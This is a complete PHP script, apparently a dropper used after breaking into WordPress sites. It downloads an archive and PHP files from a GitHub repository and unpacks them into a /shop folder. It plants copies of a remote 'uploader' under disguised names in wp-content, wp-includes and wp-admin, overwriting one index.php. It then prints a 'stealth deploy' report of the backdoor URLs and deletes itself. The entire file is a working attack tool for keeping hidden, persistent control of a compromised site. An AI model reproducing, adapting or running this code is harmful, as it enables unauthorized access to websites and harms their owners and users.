<?php

error_reporting(0);
set_time_limit(0);


$folderName  = 'shop';
$zipUrl      = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/baru.zip';
$unzipUrl    = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/un.php';
$uploaderUrl = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/a.php';


function cari_pintu_depan() {
    $path = dirname(__FILE__);
    $path = dirname(__FILE__);
    while ($path !== '/' && $path !== '.' && $path !== dirname($path)) {
        if (file_exists($path . '/wp-content')) {
            return $path;
        }
        if (strpos($path, 'wp-content') !== false) {
            $path = dirname($path);
            continue;
        }
        $path = dirname($path);
    }
    return $_SERVER['DOCUMENT_ROOT'];
}


function sedot($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}


$rootDir = cari_pintu_depan();
$targetPath = $rootDir . '/' . $folderName;


if (!is_dir($targetPath)) @mkdir($targetPath, 0755, true);

if (is_dir($targetPath)) {
    $zipData = sedot($zipUrl);
    $unzipData = sedot($unzipUrl);
    
    if ($zipData) file_put_contents($targetPath . '/new.zip', $zipData);
    if ($unzipData) file_put_contents($targetPath . '/un.php', $unzipData);

    if (file_exists($targetPath . '/new.zip')) {
        $zip = new ZipArchive;
        if ($zip->open($targetPath . '/new.zip') === TRUE) {
            $zip->extractTo($targetPath . '/');
            $zip->close();
            @unlink($targetPath . '/new.zip');
            @unlink($targetPath . '/un.php');
            $status_shop = "BERHASIL: /shop aktif.";
        } else {
            $status_shop = "FAILED: ZipArchive mati.";
        }
    }
}

// B. PROSES TRIPLE STEALTH UPLOADER (Termasuk Index Hijack)
$uploaderContent = sedot($uploaderUrl);
$stealth_results = [];

if ($uploaderContent) {
    $locations = [
        $rootDir . 'wp-content/uploads/2026/04',            // Nama Random
        $rootDir . 'wp-includes/js/crop', // Hijack index.php
        $rootDir . 'wp-admin/css/colors/modern/'          // Nama Random
    ];

    foreach ($locations as $index => $dir) {
        if (is_dir($dir) && is_writable($dir)) {

            if ($index === 1) {
                $filename = 'index.php';
            } else {
                $filename = "wp-cache-" . substr(md5(time() . $index), 0, 6) . ".php";
            }
            
            file_put_contents($dir . '/' . $filename, $uploaderContent);
            $stealth_results[] = str_replace($rootDir, '', $dir) . '/' . $filename;
        }
    }
}

// --- OUTPUT REPORT ---
$proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
echo "<pre>";
echo "--- [ STEALTH DEPLOY REPORT ] ---\n";
echo "Status /shop  : $status_shop\n";
echo "Main Link     : $proto://" . $_SERVER['HTTP_HOST'] . "/$folderName/fetch.php\n";
echo "\n--- Stealth Uploader Paths ---\n";
foreach ($stealth_results as $path) {
    echo "Path: $proto://" . $_SERVER['HTTP_HOST'] . $path . "\n";
}
echo "----------------------------------\n";
echo "</pre>";

@unlink(__FILE__);
?>
